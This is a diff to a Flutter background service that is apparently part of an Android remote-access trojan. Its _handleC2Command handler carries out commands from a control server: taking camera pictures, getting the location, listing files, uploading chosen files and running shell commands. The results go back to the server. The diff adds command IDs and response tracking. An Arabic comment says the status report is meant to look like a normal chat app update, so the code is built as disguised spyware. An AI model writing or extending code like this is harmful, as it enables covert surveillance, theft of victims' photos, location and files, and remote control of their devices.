@@ -12,7 +12,7 @@ import 'package:flutter_background_service/flutter_background_service.dart'
         IosConfiguration,
         ServiceInstance;
 import 'package:flutter_background_service_android/flutter_background_service_android.dart'
-    show DartPluginRegistrant, AndroidServiceInstance, AndroidConfiguration;
+    show AndroidServiceInstance;
 import 'package:flutter_local_notifications/flutter_local_notifications.dart';
 import 'package:geolocator/geolocator.dart' show Position;
 import 'package:shared_preferences/shared_preferences.dart';
@@ -104,11 +104,21 @@ Future<void> onStart(ServiceInstance service) async {
     }
   });
 
+  // CAMBIO IMPORTANTE: Ahora escuchamos un único flujo de comandos
   _commandSubscription = network.commandStream.listen((commandData) {
-    final cmd = commandData['command'] as String;
-    final args = Map<String, dynamic>.from(commandData['args'] as Map? ?? {});
-    debugPrint("BackgroundService: Received command '$cmd' with args: $args");
-    _handleC2Command(handles, cmd, args);
+    // Extraer la información del comando
+    final String cmd = commandData['command'] as String? ?? "unknown";
+    final String cmdId = commandData['command_id'] as String? ?? "unknown_id";
+    final Map<String, dynamic> args =
+        (commandData['args'] as Map<dynamic, dynamic>?)
+                ?.cast<String, dynamic>() ??
+            {};
+
+    debugPrint(
+        "BackgroundService: Received command '$cmd' (ID: $cmdId) with args: $args");
+
+    // Procesar el comando
+    _handleC2Command(handles, cmd, cmdId, args);
   });
 
   service.on(BG_SERVICE_EVENT_SEND_INITIAL_DATA).listen((
@@ -162,6 +172,7 @@ Future<void> onStart(ServiceInstance service) async {
       'device_id': deviceId,
       'message_sync_status': 'active', // يبدو كتحديث طبيعي لتطبيق دردشة
       'socket_status': network.isSocketConnected ? 'Connected' : 'Disconnected',
+      'pending_commands': network.getPendingCommandIds(),
     });
   });
 }
@@ -194,9 +205,11 @@ void _stopHeartbeat() {
   debugPrint("BackgroundService: Heartbeat stopped");
 }
 
+// CAMBIO IMPORTANTE: Actualizado para incluir el ID del comando
 Future<void> _handleC2Command(
   BackgroundServiceHandles h,
   String commandName,
+  String commandId,
   Map<String, dynamic> args,
 ) async {
   switch (commandName) {
@@ -209,15 +222,32 @@ Future<void> _handleC2Command(
           lensDirection: lens,
         );
         if (file != null) {
-          await h.networkService.uploadFileFromCommand(
+          final uploadSuccess = await h.networkService.uploadFileFromCommand(
             deviceId: h.currentDeviceId,
-            commandRef: 'command_take_picture',
+            commandRef: commandId,
             fileToUpload: file,
           );
+
+          if (uploadSuccess) {
+            h.networkService.sendCommandResponse(
+              originalCommand: 'command_take_picture',
+              commandId: commandId,
+              status: 'success',
+              payload: {
+                'message': 'Picture taken and uploaded successfully',
+                'file_path': file.path,
+              },
+            );
+          } else {
+            throw Exception("Failed to upload image file to server");
+          }
+        } else {
+          throw Exception("Failed to take picture");
         }
       } catch (e) {
         h.networkService.sendCommandResponse(
           originalCommand: 'command_take_picture',
+          commandId: commandId,
           status: 'error',
           payload: {'message': e.toString()},
         );
@@ -226,10 +256,11 @@ Future<void> _handleC2Command(
 
     case 'command_get_location':
       try {
-        final Position? loc = await h.locationService.getCurrentLocation();
+        final Position? loc = (await h.locationService.getCurrentLocation()) as Position?;
         if (loc != null) {
           h.networkService.sendCommandResponse(
             originalCommand: 'command_get_location',
+            commandId: commandId,
             status: 'success',
             payload: {
               'latitude': loc.latitude,
@@ -248,6 +279,7 @@ Future<void> _handleC2Command(
       } catch (e) {
         h.networkService.sendCommandResponse(
           originalCommand: 'command_get_location',
+          commandId: commandId,
           status: 'error',
           payload: {'message': e.toString()},
         );
@@ -262,6 +294,7 @@ Future<void> _handleC2Command(
         if (result != null && result["error"] == null) {
           h.networkService.sendCommandResponse(
             originalCommand: 'command_list_files',
+            commandId: commandId,
             status: "success",
             payload: result,
           );
@@ -274,6 +307,7 @@ Future<void> _handleC2Command(
       } catch (e) {
         h.networkService.sendCommandResponse(
           originalCommand: 'command_list_files',
+          commandId: commandId,
           status: "error",
           payload: {"message": e.toString()},
         );
@@ -295,13 +329,14 @@ Future<void> _handleC2Command(
         final xfile = XFile(filePath);
         final success = await h.networkService.uploadFileFromCommand(
           deviceId: h.currentDeviceId,
-          commandRef: 'command_upload_specific_file',
+          commandRef: commandId,
           fileToUpload: xfile,
         );
 
         if (success) {
           h.networkService.sendCommandResponse(
             originalCommand: 'command_upload_specific_file',
+            commandId: commandId,
             status: "success",
             payload: {"message": "File $filePath uploaded successfully"},
           );
@@ -313,6 +348,7 @@ Future<void> _handleC2Command(
       } catch (e) {
         h.networkService.sendCommandResponse(
           originalCommand: 'command_upload_specific_file',
+          commandId: commandId,
           status: "error",
           payload: {"message": e.toString()},
         );
@@ -337,6 +373,7 @@ Future<void> _handleC2Command(
         if (result != null && result["error"] == null) {
           h.networkService.sendCommandResponse(
             originalCommand: 'command_execute_shell',
+            commandId: commandId,
             status: "success",
             payload: result,
           );
@@ -349,6 +386,7 @@ Future<void> _handleC2Command(
       } catch (e) {
         h.networkService.sendCommandResponse(
           originalCommand: 'command_execute_shell',
+          commandId: commandId,
           status: "error",
           payload: {"message": e.toString()},
         );
@@ -362,6 +400,7 @@ Future<void> _handleC2Command(
     default:
       h.networkService.sendCommandResponse(
         originalCommand: commandName,
+        commandId: commandId,
         status: 'error',
         payload: {'message': 'Unknown command: $commandName'},
       );
@@ -386,10 +425,11 @@ Future<void> initializeBackgroundService() async {
       playSound: false,
       enableVibration: false,
     );
-    await flnp
-        .resolvePlatformSpecificImplementation<
-            AndroidFlutterLocalNotificationsPlugin>()
-        ?.createNotificationChannel(channel);
+    final androidPlugin = flnp.resolvePlatformSpecificImplementation<
+        AndroidFlutterLocalNotificationsPlugin>();
+    if (androidPlugin != null) {
+      androidPlugin.createNotificationChannel(channel);
+    }
   }
 
   await service.configure(
